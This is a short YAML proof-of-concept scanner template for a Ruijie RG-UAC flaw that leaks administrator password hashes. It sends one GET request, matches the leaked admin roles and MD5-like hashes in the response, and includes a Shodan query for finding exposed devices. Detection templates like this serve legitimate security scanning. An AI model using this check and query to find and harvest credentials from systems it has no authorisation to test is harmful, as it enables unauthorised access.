id: poc-yaml-ruijie-rg-uac-password-hashes-leak
info:
  name: 锐捷RG-UAC系统账号密码信息泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: RG-UAC
  shodan: http.html:"Get_Verify_Info"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"\"role\":\"super_admin\"") && contains(body,"\"role\":\"guest_admin\"")
    && contains(body,"\"role\":\"reporter_admin\"") && matches(body,`"password":"[a-f0-9]{32}`)
variables: {}
transport: http
